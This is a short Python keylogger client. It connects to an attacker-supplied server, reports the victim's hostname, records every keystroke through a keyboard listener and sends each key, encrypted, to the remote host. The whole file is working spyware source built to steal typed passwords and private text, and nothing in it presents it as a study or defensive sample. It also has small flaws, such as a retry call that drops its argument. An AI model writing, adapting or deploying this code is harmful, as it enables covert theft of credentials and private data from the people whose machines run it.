#!/usr/bin/env python3

import socket
from pynput.keyboard import Listener
import os
import sys
import time
from pyaes256 import PyAES256

def connect(address, port=13579):
    global enc
    global srv
    global password

    # Connect and send hostname
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.connect((address, port))
    srv.send(f'{socket.gethostname()}\n'.encode('utf-8'))

    # Set up encryption scheme
    enc = PyAES256()
    password = None
    while not password:
        password = srv.recv().decode('utf-8')

    return password

def ship(sequence):
    srv.send(enc.encrypt(sequence, password).encode('utf-8'))
  
def on_press(key):
    chars = []

    try:
        ship(str(key.char))
    except AttributeError:
        ship(f'[{key}]')

def daemon():
    with Listener(on_press=on_press) as listener:
        listener.join()

def main(addr):
    try: 
        connect(addr)
    except ConnectionRefusedError:
        print("Couldn't connect to the server, trying again in 5 seconds...")
        time.sleep(5)
        main()

    try:
        daemon()
    except ConnectionResetError: 
        exit()

if __name__ == "__main__":
    addr = sys.argv[1]
    main(addr)